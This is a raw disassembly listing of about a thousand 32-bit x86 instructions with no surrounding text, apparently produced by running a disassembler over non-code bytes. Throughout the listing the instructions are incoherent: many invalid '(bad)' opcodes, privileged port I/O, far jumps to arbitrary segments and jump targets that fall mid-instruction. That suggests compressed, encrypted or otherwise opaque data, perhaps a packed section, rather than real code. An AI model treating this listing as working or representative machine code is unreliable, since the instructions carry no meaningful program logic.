  41bcc4:	sbb    bl,al
  41bcc6:	jae    0x41bd22
  41bcc8:	pushw  ss
  41bcca:	cs popf 
  41bccc:	mov    bl,0x72
  41bcce:	pop    esp
  41bccf:	mov    bh,0x8f
  41bcd1:	dec    edi
  41bcd2:	or     bl,dh
  41bcd4:	or     BYTE PTR [esi-0x3ea8b638],cl
  41bcda:	mov    ah,0x3d
  41bcdc:	sub    BYTE PTR [edi],ah
  41bcde:	div    DWORD PTR [edx+0x34]
  41bce1:	jae    0x41bc67
  41bce3:	scas   al,BYTE PTR es:[edi]
  41bce4:	jle    0x41bca4
  41bce6:	shl    DWORD PTR [eax+0xdba975b],cl
  41bcec:	xchg   BYTE PTR [ebp-0xbe3b58a],dl
  41bcf2:	aaa    
  41bcf3:	xor    eax,0x8dc77131
  41bcf8:	jl     0x41bcc0
  41bcfa:	ret    
  41bcfb:	sahf   
  41bcfc:	sbb    BYTE PTR [ebx+0x69],bl
  41bcff:	sbb    DWORD PTR [ebx+ebx*8-0x11],ecx
  41bd03:	repnz inc esp
  41bd05:	mov    BYTE PTR [ebp-0x5],bh
  41bd08:	xchg   esi,eax
  41bd09:	dec    ebp
  41bd0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd0b:	fimul  WORD PTR [ecx+0xf48e0d1]
  41bd11:	or     al,0x40
  41bd13:	bound  ebx,QWORD PTR [edi-0x10]
  41bd16:	jne    0x41bd91
  41bd18:	lahf   
  41bd19:	out    dx,al
  41bd1a:	adc    al,0x44
  41bd1c:	addr16 inc ebp
  41bd1e:	push   eax
  41bd1f:	or     cl,dl
  41bd21:	xchg   ecx,eax
  41bd22:	cmc    
  41bd23:	pop    ebp
  41bd24:	dec    ebx
  41bd25:	cmp    cl,cl
  41bd27:	test   ecx,ebp
  41bd29:	mov    WORD PTR [ebp-0x58cac466],es
  41bd2f:	scas   al,BYTE PTR es:[edi]
  41bd30:	sbb    bh,BYTE PTR [ebp-0x3c4aebf]
  41bd36:	dec    esp
  41bd37:	xor    ah,dh
  41bd39:	jnp    0x41bd9e
  41bd3b:	cwde   
  41bd3c:	xor    edx,esp
  41bd3e:	scas   eax,DWORD PTR es:[edi]
  41bd3f:	pop    ecx
  41bd40:	iret   
  41bd41:	aam    0xcf
  41bd43:	gs stc 
  41bd45:	jp     0x41bd38
  41bd47:	xor    ecx,esi
  41bd49:	out    dx,al
  41bd4a:	cmp    al,0x48
  41bd4c:	xchg   edi,eax
  41bd4d:	icebp  
  41bd4e:	in     eax,0xb0
  41bd50:	in     al,dx
  41bd51:	pop    ss
  41bd52:	sub    ebp,DWORD PTR ds:0x28f1dd31
  41bd58:	call   FWORD PTR [ecx+edx*2+0x5]
  41bd5c:	push   ds
  41bd5d:	cwde   
  41bd5e:	jmp    0x41bcfc
  41bd60:	js     0x41bd8b
  41bd62:	lahf   
  41bd63:	mov    WORD PTR [ecx],?
  41bd65:	dec    eax
  41bd66:	push   edi
  41bd67:	retf   
  41bd68:	mov    ds:0x6ba87fab,al
  41bd6d:	mov    bl,0xee
  41bd6f:	cs pop ds
  41bd71:	or     eax,esi
  41bd73:	sbb    DWORD PTR [ebp-0x64d0a1ad],esi
  41bd79:	ret    0xad2d
  41bd7c:	stc    
  41bd7d:	scas   al,BYTE PTR es:[edi]
  41bd7e:	outs   dx,BYTE PTR ds:[esi]
  41bd7f:	punpckldq mm6,DWORD PTR [edi+0x5]
  41bd83:	pop    ss
  41bd84:	adc    esi,DWORD PTR [edi+0x27c2d1cd]
  41bd8a:	xlat   BYTE PTR ds:[ebx]
  41bd8b:	mov    eax,ds:0x62c9a682
  41bd90:	retf   
  41bd91:	in     al,dx
  41bd92:	icebp  
  41bd93:	add    eax,0xa3274f04
  41bd98:	ins    DWORD PTR es:[edi],dx
  41bd99:	mov    edx,0x28532530
  41bd9e:	nop
  41bd9f:	sahf   
  41bda0:	(bad)  
  41bda1:	or     BYTE PTR es:[ecx-0x35245f55],dh
  41bda8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bda9:	add    ecx,esp
  41bdab:	jp     0x41bd6a
  41bdad:	icebp  
  41bdae:	dec    ebp
  41bdaf:	push   es
  41bdb0:	jl     0x41bd9a
  41bdb2:	clc    
  41bdb3:	or     DWORD PTR [edi+0x57],edi
  41bdb6:	add    eax,0x7fbbbd43
  41bdbb:	fstp   TBYTE PTR [esi+0x4b5ed559]
  41bdc1:	loop   0x41be0a
  41bdc3:	pusha  
  41bdc4:	xor    ah,bl
  41bdc6:	idiv   BYTE PTR [ecx-0x11e84f55]
  41bdcc:	xchg   esi,eax
  41bdcd:	call   0xfbc4:0x5f8a5d5c
  41bdd4:	push   ebp
  41bdd5:	xor    DWORD PTR ds:0x5b05904f,edx
  41bddb:	popf   
  41bddc:	ja     0x41be50
  41bdde:	ins    DWORD PTR es:[edi],dx
  41bddf:	es scas eax,DWORD PTR es:[edi]
  41bde1:	dec    esp
  41bde2:	push   0x5a
  41bde4:	dec    ebx
  41bde5:	out    0xa5,al
  41bde7:	int3   
  41bde8:	repz aas 
  41bdea:	mov    ds:0xde7104f9,eax
  41bdef:	xor    DWORD PTR [ecx],esp
  41bdf1:	xor    eax,0x5d1ea251
  41bdf6:	scas   al,BYTE PTR es:[edi]
  41bdf7:	pop    ecx
  41bdf8:	inc    edi
  41bdf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bdfa:	sub    edx,esi
  41bdfc:	lahf   
  41bdfd:	sub    DWORD PTR [ebp-0x17],0x2c
  41be01:	pop    ds
  41be02:	jns    0x41be0c
  41be04:	lea    esi,[edi]
  41be06:	pushf  
  41be07:	jecxz  0x41bde4
  41be09:	and    eax,0xe5d64a32
  41be0e:	lods   eax,DWORD PTR ds:[esi]
  41be0f:	fisttp WORD PTR [esi-0x24]
  41be12:	call   0x6e62:0xa6117aeb
  41be19:	xor    DWORD PTR [esi],esi
  41be1b:	loop   0x41be8f
  41be1d:	(bad)  
  41be1e:	call   0x570de4dc
  41be23:	or     eax,0xea526656
  41be28:	pop    ebx
  41be29:	pop    es
  41be2a:	sub    DWORD PTR [eax-0x35c47088],ecx
  41be30:	cmp    BYTE PTR [esi],cl
  41be32:	mov    ch,0x5c
  41be34:	pop    ecx
  41be35:	fstp   TBYTE PTR [eax-0xc]
  41be38:	jecxz  0x41be95
  41be3a:	lods   al,BYTE PTR ds:[esi]
  41be3b:	push   edx
  41be3c:	loop   0x41be43
  41be3e:	ret    0x2524
  41be41:	dec    esp
  41be42:	(bad)
  41be45:	sub    ebp,DWORD PTR [eax-0xaab1932]
  41be4b:	mov    BYTE PTR [esi+0x310098f1],dh
  41be51:	mov    edx,0x63068888
  41be56:	xchg   BYTE PTR [edi+edx*2],bh
  41be59:	adc    al,0x31
  41be5b:	mov    cl,0xa6
  41be5d:	and    DWORD PTR [edi],esi
  41be5f:	mov    bl,0x4a
  41be61:	dec    eax
  41be62:	mov    cl,0xb5
  41be64:	jge    0x41be3a
  41be66:	jp     0x41beda
  41be68:	dec    edx
  41be69:	int3   
  41be6a:	or     al,0x7d
  41be6c:	push   ss
  41be6d:	mov    ds:0xed16fea0,eax
  41be72:	pusha  
  41be73:	xchg   ebx,eax
  41be74:	and    edi,DWORD PTR [eax+edi*2-0x6]
  41be78:	daa    
  41be79:	daa    
  41be7a:	leave  
  41be7b:	dec    edx
  41be7c:	aaa    
  41be7d:	stc    
  41be7e:	(bad)  
  41be7f:	sbb    al,0x3c
  41be81:	adc    al,0x91
  41be83:	or     DWORD PTR [ecx+0x6e8b9e09],esi
  41be89:	mov    bl,0x93
  41be8b:	dec    edx
  41be8c:	imul   esi,DWORD PTR [edi+0x42],0x9d177aff
  41be93:	adc    DWORD PTR [edi+0x69e5aa5e],eax
  41be99:	(bad)  
  41be9a:	pop    ss
  41be9b:	stc    
  41be9c:	loopne 0x41be8f
  41be9e:	repnz iret 
  41bea0:	das    
  41bea1:	scas   eax,DWORD PTR es:[edi]
  41bea2:	xchg   ebx,eax
  41bea3:	jno    0x41be36
  41bea5:	or     dh,BYTE PTR [edi-0x22]
  41bea8:	retf   
  41bea9:	adc    eax,0x73fc7bfe
  41beae:	pop    ebp
  41beaf:	jmp    FWORD PTR [ebx-0x4e]
  41beb2:	cs xchg edi,eax
  41beb4:	inc    esp
  41beb5:	inc    esi
  41beb6:	ds cwde 
  41beb8:	stos   BYTE PTR es:[edi],al
  41beb9:	in     al,0x2c
  41bebb:	xor    edi,ebp
  41bebd:	jne    0x41bec5
  41bebf:	shl    DWORD PTR [edi],0x18
  41bec2:	push   esi
  41bec3:	sbb    DWORD PTR [eax],ecx
  41bec5:	mov    ah,0x6d
  41bec7:	mov    dh,0x27
  41bec9:	ja     0x41be59
  41becb:	inc    esp
  41becc:	mov    edi,0xc426a342
  41bed1:	idiv   DWORD PTR [ecx-0x2a]
  41bed4:	add    eax,0x51bc8e00
  41bed9:	lock out 0xc8,eax
  41bedc:	jmp    0x215c:0x41abc332
  41bee3:	jae    0x41bf54
  41bee5:	fst    DWORD PTR [edi+0x3e7cdc0f]
  41beeb:	fnstenv [eax]
  41beed:	out    dx,al
  41beee:	out    dx,eax
  41beef:	jae    0x41be79
  41bef1:	inc    ebp
  41bef2:	imul   esp,esi,0x4c
  41bef5:	paddb  mm6,QWORD PTR [edi+0x51]
  41bef9:	pushf  
  41befa:	push   DWORD PTR [eax]
  41befc:	fidiv  WORD PTR [eax]
  41befe:	sbb    eax,0x1c448fa4
  41bf03:	pop    esp
  41bf04:	je     0x41bf50
  41bf06:	adc    al,0x7c
  41bf08:	mov    eax,ds:0x3b00e267
  41bf0d:	add    eax,0x7d768f76
  41bf12:	into   
  41bf13:	in     al,dx
  41bf14:	mov    WORD PTR ds:0x331e1fcd,ss
  41bf1a:	xchg   esp,eax
  41bf1b:	pop    esp
  41bf1c:	and    esp,DWORD PTR [edx+0xd]
  41bf1f:	xor    al,0xd7
  41bf21:	outs   dx,BYTE PTR ds:[esi]
  41bf22:	or     dl,BYTE PTR [edx+0x60]
  41bf25:	aam    0x15
  41bf27:	cmp    bl,BYTE PTR [eax+0x3fad024b]
  41bf2d:	mov    esi,0x6b03c086
  41bf32:	test   ecx,0xe3ec0e5a
  41bf38:	clc    
  41bf39:	nop
  41bf3a:	fmul   st(5),st
  41bf3c:	xor    DWORD PTR [ebp-0x40fd61bb],ebp
  41bf42:	stc    
  41bf43:	mov    esp,0x97927c83
  41bf48:	jno    0x41bee2
  41bf4a:	test   ecx,0x5468caff
  41bf50:	cld    
  41bf51:	pop    eax
  41bf52:	popf   
  41bf53:	inc    esi
  41bf54:	sub    al,0xbe
  41bf56:	jnp    0x41bf35
  41bf58:	test   al,0x6d
  41bf5a:	popf   
  41bf5b:	adc    DWORD PTR [ecx],edx
  41bf5d:	mov    ecx,0x162314fa
  41bf62:	in     eax,dx
  41bf63:	sti    
  41bf64:	sar    DWORD PTR [esi],1
  41bf66:	add    al,0x73
  41bf68:	adc    BYTE PTR [eax-0x15],ah
  41bf6b:	and    al,0x3b
  41bf6d:	lock jmp 0x31382d0
  41bf73:	push   ecx
  41bf74:	pop    ss
  41bf75:	dec    ecx
  41bf76:	cmp    ecx,DWORD PTR [eax+0x69a1e912]
  41bf7c:	cs cld 
  41bf7e:	dec    esi
  41bf7f:	add    BYTE PTR [edi+0x28933e07],0x1e
  41bf86:	push   edx
  41bf87:	int    0xe8
  41bf89:	dec    ebx
  41bf8a:	gs xchg ecx,eax
  41bf8c:	or     al,BYTE PTR [ebp-0x6966f61e]
  41bf92:	fs in  eax,0x9f
  41bf95:	stc    
  41bf96:	xchg   cl,dl
  41bf98:	int    0x54
  41bf9a:	and    esp,0x33a6280d
  41bfa0:	js     0x41bf2e
  41bfa2:	push   esp
  41bfa3:	cmp    DWORD PTR [ecx-0x4e7a2011],esp
  41bfa9:	add    edi,DWORD PTR [esi-0x27410d58]
  41bfaf:	icebp  
  41bfb0:	inc    ebx
  41bfb1:	addr16 sahf 
  41bfb3:	aas    
  41bfb4:	shl    BYTE PTR [esp+edx*1+0x57],0x25
  41bfb9:	dec    edx
  41bfba:	fstp   QWORD PTR [ebx+ecx*4+0x57]
  41bfbe:	(bad)  
  41bfbf:	dec    esp
  41bfc0:	push   esi
  41bfc1:	aas    
  41bfc2:	cli    
  41bfc3:	and    eax,0x26f35073
  41bfc8:	hlt    
  41bfc9:	and    BYTE PTR [esi+0x6b],ch
  41bfcc:	ss mov edx,0x44c8fd42
  41bfd2:	dec    edi
  41bfd3:	pop    edx
  41bfd4:	or     eax,0xe00e3c6b
  41bfd9:	or     DWORD PTR [edi+0x395ccb51],ecx
  41bfdf:	adc    BYTE PTR [esi],bl
  41bfe1:	push   ebx
  41bfe2:	fwait
  41bfe3:	and    bh,BYTE PTR [ebx-0x47]
  41bfe6:	add    edi,DWORD PTR [edi]
  41bfe8:	adc    dx,WORD PTR [ebx]
  41bfeb:	sbb    dh,bl
  41bfed:	adc    eax,0x3ef1e863
  41bff2:	and    ecx,DWORD PTR [ebx+esi*1-0x46]
  41bff6:	int    0xe1
  41bff8:	aam    0x56
  41bffa:	clc    
  41bffb:	pop    edx
  41bffc:	mov    ah,cl
  41bffe:	popa   
  41bfff:	aaa    
  41c000:	gs pop ss
  41c002:	fldlg2 
  41c004:	inc    esi
  41c005:	pop    ebp
  41c006:	xlat   BYTE PTR ds:[ebx]
  41c007:	inc    ebp
  41c008:	out    0xf5,eax
  41c00a:	inc    edi
  41c00b:	push   esi
  41c00c:	mov    ebp,gs
  41c00e:	jnp    0x41bfd5
  41c010:	int    0x2e
  41c012:	cli    
  41c013:	jmp    0x49e69a0e
  41c018:	push   0x6d305f0e
  41c01d:	fistp  DWORD PTR [ebx]
  41c01f:	lods   eax,DWORD PTR ds:[esi]
  41c020:	pop    es
  41c021:	adc    DWORD PTR [ebp+0x70ed339c],edx
  41c027:	fmulp  st(7),st
  41c029:	add    bh,al
  41c02b:	imul   edx,DWORD PTR [ebp-0x69981c4b],0xc64d6250
  41c035:	push   cs
  41c036:	dec    ebp
  41c037:	sbb    al,0x55
  41c039:	or     DWORD PTR [esi+0x4a09f7ed],0x6f
  41c040:	mov    edi,0x6c3a4c47
  41c045:	dec    ebp
  41c046:	imul   ebp,DWORD PTR [ecx],0xfffffffe
  41c049:	mov    ecx,0x1319d394
  41c04e:	(bad)  
  41c04f:	fnstsw WORD PTR [edi]
  41c051:	fiadd  WORD PTR [esp]
  41c054:	dec    ebp
  41c055:	sub    eax,0x5eae4e6f
  41c05a:	mov    edi,0xd141d3b
  41c05f:	add    BYTE PTR [edi],dl
  41c061:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c062:	pop    esp
  41c063:	test   al,0xcf
  41c065:	cmp    ebx,ebx
  41c067:	(bad)
  41c06a:	out    0x55,eax
  41c06c:	sub    eax,0xffb80ea7
  41c071:	scas   al,BYTE PTR es:[edi]
  41c072:	test   ebp,edi
  41c074:	sub    DWORD PTR [edx-0x64d52fcc],esp
  41c07a:	push   0x18144365
  41c07f:	jb     0x41c020
  41c081:	test   BYTE PTR [edi],dl
  41c083:	pop    ds
  41c084:	mov    ebp,0xb44b9a58
  41c089:	inc    BYTE PTR [esi+0x2a06fb92]
  41c08f:	or     al,0x5c
  41c091:	mov    ebp,DWORD PTR [eax+ebx*4]
  41c094:	in     al,0x9c
  41c096:	jne    0x41c02d
  41c098:	xlat   BYTE PTR ds:[ebx]
  41c099:	rcl    DWORD PTR [edx-0x22],1
  41c09c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c09d:	xor    ah,al
  41c09f:	fsub   st,st(5)
  41c0a1:	rcl    BYTE PTR [eax+0x25],cl
  41c0a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0a5:	retf   0x599d
  41c0a8:	int3   
  41c0a9:	mov    ebp,DWORD PTR [ecx]
  41c0ab:	das    
  41c0ac:	push   esp
  41c0ad:	hlt    
  41c0ae:	mov    edx,0x72e9760f
  41c0b3:	out    0xbc,al
  41c0b5:	push   eax
  41c0b6:	inc    esp
  41c0b7:	inc    ebx
  41c0b8:	adc    al,BYTE PTR [esi+edi*2+0x7b056d35]
  41c0bf:	int    0xd9
  41c0c1:	jge    0x41c0b9
  41c0c3:	mov    ebp,0x13febf99
  41c0c8:	sar    dl,1
  41c0ca:	in     eax,0x2d
  41c0cc:	loop   0x41c05d
  41c0ce:	int    0x23
  41c0d0:	cmc    
  41c0d1:	xchg   esp,eax
  41c0d2:	les    eax,FWORD PTR [edi]
  41c0d4:	arpl   WORD PTR [edi-0x2de149be],dx
  41c0da:	sbb    ch,BYTE PTR [edi]
  41c0dc:	sub    eax,0xba69c73f
  41c0e1:	jle    0x41c0fc
  41c0e3:	dec    eax
  41c0e4:	repnz aas 
  41c0e6:	gs mov bl,0x82
  41c0e9:	enter  0x9654,0xa1
  41c0ed:	cmp    eax,0xd6d12698
  41c0f2:	ss mov ebp,0x49f8496e
  41c0f8:	repz push ecx
  41c0fa:	fimul  WORD PTR [ebp+0x15]
  41c0fd:	arpl   WORD PTR [edx+ebx*8-0x79],di
  41c101:	ror    BYTE PTR [eax-0x72],1
  41c104:	popf   
  41c105:	arpl   bx,di
  41c107:	fist   WORD PTR [eax-0x1c]
  41c10a:	aam    0x28
  41c10c:	leave  
  41c10d:	pop    ecx
  41c10e:	outs   dx,DWORD PTR ds:[esi]
  41c10f:	das    
  41c110:	push   eax
  41c111:	sub    eax,0x6bf50449
  41c116:	and    DWORD PTR [eax],ebx
  41c118:	outs   dx,DWORD PTR ds:[esi]
  41c119:	add    al,0x5b
  41c11b:	mov    dh,0x3e
  41c11d:	test   BYTE PTR [edx-0x2a],cl
  41c120:	push   esp
  41c121:	mov    gs,WORD PTR [ecx+0x3fb5f0d6]
  41c127:	mov    esp,0xf7222781
  41c12c:	xchg   DWORD PTR [edi-0x49f74d2b],esi
  41c132:	not    BYTE PTR [edx-0x58]
  41c135:	data16 (bad) [ecx+0x77]
  41c139:	fcmovnbe st,st(5)
  41c13b:	adc    BYTE PTR [ebx+0x1a9f1e17],bh
  41c141:	js     0x41c0d4
  41c143:	sti    
  41c144:	and    edx,eax
  41c146:	dec    ebx
  41c147:	sbb    DWORD PTR [edi+0x72],edi
  41c14a:	(bad)  
  41c14c:	sti    
  41c14d:	push   0x1d954caf
  41c152:	je     0x41c158
  41c154:	pop    edi
  41c155:	xchg   esi,eax
  41c156:	mov    ch,0x9
  41c158:	xchg   edi,eax
  41c159:	nop
  41c15a:	jb     0x41c1a3
  41c15c:	dec    edx
  41c15d:	retf   
  41c15e:	cli    
  41c15f:	mov    al,ds:0x3712b2f1
  41c164:	test   DWORD PTR [ebx+edx*8-0x7f],esi
  41c168:	lods   al,BYTE PTR ds:[esi]
  41c169:	retf   
  41c16a:	cs and ch,0x4
  41c16e:	and    BYTE PTR [edi+esi*8],ah
  41c171:	xchg   esp,esp
  41c173:	jns    0x41c117
  41c175:	or     ah,BYTE PTR [ebp-0x5]
  41c178:	loop   0x41c135
  41c17a:	adc    DWORD PTR [esi],esp
  41c17c:	mov    ebx,0x69f2853d
  41c181:	lds    eax,FWORD PTR [edx+esi*1+0x76301a62]
  41c188:	sub    BYTE PTR [ebp+edx*2+0x79dd6e44],ch
  41c18f:	fwait
  41c190:	or     eax,0xfacac856
  41c195:	mov    edi,0xf493be1d
  41c19a:	dec    ebp
  41c19b:	push   ebx
  41c19c:	rcr    DWORD PTR [esi-0x1ef72375],cl
  41c1a2:	or     bl,ah
  41c1a4:	sub    BYTE PTR [ebp-0x64857f5],dh
  41c1aa:	mov    edi,0x7b744990
  41c1af:	pop    esi
  41c1b0:	dec    eax
  41c1b1:	xor    eax,0x4f9f727f
  41c1b6:	test   eax,0xa2b5c807
  41c1bb:	(bad)  
  41c1bc:	cld    
  41c1bd:	mov    al,0x1b
  41c1bf:	pop    edx
  41c1c0:	sub    DWORD PTR [esi+0x4a],edx
  41c1c3:	sbb    ch,BYTE PTR [ebx+eax*2+0x43]
  41c1c7:	popa   
  41c1c8:	mov    al,ds:0x369528e9
  41c1cd:	or     eax,0x961567c9
  41c1d2:	fstp   DWORD PTR [ecx-0x36]
  41c1d5:	jo     0x41c1f3
  41c1d7:	loopne 0x41c1ea
  41c1d9:	cld    
  41c1da:	pop    ss
  41c1db:	dec    edx
  41c1dc:	lods   al,BYTE PTR ds:[esi]
  41c1dd:	call   0xee3e9d29
  41c1e2:	ds enter 0x1cc8,0x91
  41c1e7:	and    bl,BYTE PTR [edx]
  41c1e9:	jns    0x41c23e
  41c1eb:	mov    ds:0xa0d8dab3,al
  41c1f0:	or     al,0xf4
  41c1f2:	xchg   esi,eax
  41c1f3:	ret    0x1052
  41c1f6:	push   ss
  41c1f7:	shr    BYTE PTR [edx+0x4278c915],cl
  41c1fd:	xchg   edi,eax
  41c1fe:	jl     0x41c1fe
  41c200:	test   BYTE PTR [edi],al
  41c202:	fs push ss
  41c204:	mov    esi,fs
  41c206:	mov    bl,BYTE PTR [ecx]
  41c208:	cli    
  41c209:	iret   
  41c20a:	or     eax,0x91091000
  41c20f:	inc    eax
  41c210:	popf   
  41c211:	pop    ds
  41c212:	mov    esi,0x740a723a
  41c217:	and    ebx,DWORD PTR [ecx-0x37730eab]
  41c21d:	sub    DWORD PTR [ecx-0x31],ecx
  41c220:	push   ecx
  41c221:	pop    eax
  41c222:	dec    edi
  41c223:	push   esp
  41c224:	mov    ebx,0x3c80edd6
  41c229:	loopne 0x41c290
  41c22b:	mov    ds:0x6f411cdd,al
  41c230:	mov    esi,0x741e27ef
  41c235:	out    0x19,al
  41c237:	aad    0xbb
  41c239:	push   edi
  41c23a:	(bad)  
  41c23b:	div    BYTE PTR [ecx]
  41c23d:	enter  0xb9,0xcb
  41c241:	bound  ebx,QWORD PTR [edi-0x70]
  41c244:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c245:	call   0xbc13:0x322065d9
  41c24c:	push   eax
  41c24d:	inc    edi
  41c24e:	out    0x2a,al
  41c250:	out    0x5d,eax
  41c252:	add    DWORD PTR [ebx+0x63],0x8
  41c256:	push   ds
  41c257:	inc    eax
  41c258:	loop   0x41c2b3
  41c25a:	cwde   
  41c25b:	push   edx
  41c25c:	jno    0x41c21a
  41c25e:	je     0x41c1e1
  41c260:	adc    BYTE PTR [ecx+0x3d361c07],0xd1
  41c267:	add    BYTE PTR ds:0xd16920d3,dl
  41c26d:	shl    BYTE PTR ds:0x78d125c0,cl
  41c273:	jne    0x41c2cb
  41c275:	retf   
  41c276:	in     al,0xb6
  41c278:	sbb    BYTE PTR [ebx-0x2a3c5a32],ch
  41c27e:	out    dx,al
  41c27f:	xchg   edx,eax
  41c280:	outs   dx,DWORD PTR ds:[esi]
  41c281:	jnp    0x41c286
  41c283:	std    
  41c284:	ss test eax,0x5b139e0b
  41c28a:	pop    eax
  41c28b:	je     0x41c231
  41c28d:	(bad)  
  41c28e:	sar    BYTE PTR ds:0xf94e99a2,1
  41c294:	loop   0x41c229
  41c296:	sbb    eax,0x5bf59e61
  41c29b:	push   0x859eef95
  41c2a0:	(bad)  
  41c2a1:	push   ebp
  41c2a2:	gs leave 
  41c2a4:	cmc    
  41c2a5:	shl    DWORD PTR [edx+eiz*4-0x7f],1
  41c2a9:	fiadd  WORD PTR [edx+0x4a]
  41c2ac:	(bad)  
  41c2ad:	jmp    0xb1fac4b5
  41c2b2:	in     al,0xab
  41c2b4:	adc    DWORD PTR [edx-0x72],esp
  41c2b7:	sbb    cl,dl
  41c2b9:	cmp    esi,DWORD PTR [ecx-0x61e47b72]
  41c2bf:	outs   dx,BYTE PTR ds:[esi]
  41c2c0:	push   ebp
  41c2c1:	jle    0x41c2e8
  41c2c3:	jns    0x41c266
  41c2c5:	and    BYTE PTR [ecx+0x23],ah
  41c2c8:	dec    ebp
  41c2c9:	test   eax,0xc2cd9502
  41c2ce:	pop    eax
  41c2cf:	popf   
  41c2d0:	call   0x1859:0xcb6fb727
  41c2d7:	cld    
  41c2d8:	xor    BYTE PTR [esi-0x2acf2808],cl
  41c2de:	(bad)  
  41c2df:	pushf  
  41c2e0:	call   DWORD PTR [esi+0x68]
  41c2e3:	bound  esi,QWORD PTR gs:[ecx-0x70]
  41c2e7:	or     BYTE PTR [esi],ch
  41c2e9:	dec    eax
  41c2ea:	or     eax,0x5e3d9ab9
  41c2ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2f0:	lahf   
  41c2f1:	jmp    0x6bb3:0x97214fec
  41c2f8:	mov    dh,0xd6
  41c2fa:	sar    DWORD PTR [ecx+0x14],0x33
  41c2fe:	lock or al,0xb2
  41c301:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c302:	(bad)  
  41c303:	xchg   esi,eax
  41c304:	(bad)  
  41c305:	push   ss
  41c306:	cmp    al,0x97
  41c308:	loopne 0x41c2b4
  41c30a:	ja     0x41c31c
  41c30c:	cmp    BYTE PTR [esi+0x328d7e48],dl
  41c312:	js     0x41c29f
  41c314:	jns    0x41c35f
  41c316:	adc    edi,esi
  41c318:	add    edx,DWORD PTR [ecx+ebx*2+0x4d]
  41c31c:	(bad)  
  41c31d:	imul   BYTE PTR ds:0x72344ecc
  41c323:	jg     0x41c360
  41c325:	cmp    al,0x78
  41c327:	push   ebx
  41c328:	(bad)  
  41c329:	xchg   esi,eax
  41c32a:	outs   dx,BYTE PTR ds:[esi]
  41c32b:	hlt    
  41c32c:	mov    bl,0x6
  41c32e:	addr16 xchg esi,eax
  41c330:	jmp    0x41c320
  41c332:	outs   dx,BYTE PTR ds:[esi]
  41c333:	out    dx,al
  41c334:	jl     0x41c2ba
  41c336:	leave  
  41c337:	fisttp QWORD PTR [esi-0x62422347]
  41c33d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c33e:	mov    ch,0x1f
  41c340:	sub    dh,al
  41c342:	adc    esi,esi
  41c344:	ja     0x41c2ec
  41c346:	add    dl,cl
  41c348:	lea    esi,[ebx+0x70]
  41c34b:	fmul   DWORD PTR [edi-0x1357ed29]
  41c351:	pop    ebp
  41c352:	fidiv  DWORD PTR [ebx-0x2d0626b6]
  41c358:	out    dx,al
  41c359:	leave  
  41c35a:	xchg   ebp,eax
  41c35b:	jge    0x41c30b
  41c35d:	mov    dh,0x8e
  41c35f:	push   ebx
  41c360:	dec    esi
  41c361:	xchg   esi,eax
  41c362:	xchg   esi,eax
  41c363:	scas   eax,DWORD PTR es:[edi]
  41c364:	retf   
  41c365:	les    eax,FWORD PTR [ecx+0x6b0bc57f]
  41c36b:	je     0x41c3b9
  41c36d:	push   es
  41c36e:	sti    
  41c36f:	push   ecx
  41c370:	aam    0xd0
  41c372:	adc    BYTE PTR ds:0xe88c0030,dh
  41c378:	adc    dh,BYTE PTR [ecx-0x70]
  41c37b:	cmp    al,0x5b
  41c37d:	pop    edx
  41c37e:	push   ds
  41c37f:	out    dx,al
  41c380:	shl    DWORD PTR [edi-0x18],cl
  41c383:	sub    al,0x68
  41c385:	jb     0x41c400
  41c387:	adc    BYTE PTR [eax-0x74a716cb],dl
  41c38d:	jl     0x41c335
  41c38f:	mov    cl,ch
  41c391:	sbb    BYTE PTR [edx+0x5c],0x3c
  41c395:	sahf   
  41c396:	retf   
  41c397:	sbb    DWORD PTR [esi],esi
  41c399:	adc    eax,0xc5637a7b
  41c39f:	push   ebx
  41c3a0:	xchg   edx,eax
  41c3a1:	inc    esp
  41c3a2:	pop    ebx
  41c3a3:	add    bh,0x43
  41c3a6:	pop    ebp
  41c3a7:	xor    cl,ch
  41c3a9:	adc    eax,0x4c2632cd
  41c3ae:	mov    edi,0xee19895f
  41c3b3:	pushf  
  41c3b4:	mov    bl,0xaa
  41c3b6:	push   ecx
  41c3b7:	mov    bl,0x2c
  41c3b9:	(bad)
  41c3bc:	mov    bh,0x7c
  41c3be:	or     al,0xc
  41c3c0:	(bad)  
  41c3c1:	imul   edx,DWORD PTR [esi-0x1],0x29
  41c3c5:	push   0xffffffee
  41c3c7:	sub    al,0x48
  41c3c9:	ds add eax,0xbac176b7
  41c3cf:	push   cs
  41c3d0:	or     ebx,esp
  41c3d2:	pop    esp
  41c3d3:	pop    eax
  41c3d4:	push   ds
  41c3d5:	out    dx,al
  41c3d6:	mov    dh,0x32
  41c3d8:	dec    esp
  41c3d9:	adc    esi,ecx
  41c3db:	and    edi,DWORD PTR [edx]
  41c3dd:	and    al,0xdb
  41c3df:	test   al,0x99
  41c3e1:	(bad)  
  41c3e2:	dec    edi
  41c3e3:	jns    0x41c3a2
  41c3e5:	xor    DWORD PTR [eax+0x2d],0xffffff8f
  41c3e9:	mov    ebp,0x95584857
  41c3ee:	push   ebx
  41c3ef:	pop    eax
  41c3f0:	imul   eax,DWORD PTR [ecx+0x5ce4a8be],0xdceb82ac
  41c3fa:	mov    ds:0xb41d5933,al
  41c3ff:	jnp    0x41c3fe
  41c401:	jbe    0x41c41a
  41c403:	jne    0x41c407
  41c405:	mov    eax,0x28b90add
  41c40a:	adc    DWORD PTR [eax-0x23ab4d3c],esi
  41c410:	fs hlt 
  41c412:	sub    eax,0xed5a796a
  41c417:	mov    ds:0x5c85c229,al
  41c41c:	lds    edx,FWORD PTR [esi]
  41c41e:	out    0x32,al
  41c420:	stos   DWORD PTR es:[edi],eax
  41c421:	jno    0x41c40e
  41c423:	jb     0x41c439
  41c425:	bound  ebx,QWORD PTR [esi]
  41c427:	lock mov ax,si
  41c42b:	lods   al,BYTE PTR ds:[esi]
  41c42c:	and    al,0xb8
  41c42e:	sub    BYTE PTR [eax],dl
  41c430:	aad    0xe6
  41c432:	bound  ecx,QWORD PTR [edi]
  41c434:	(bad)  
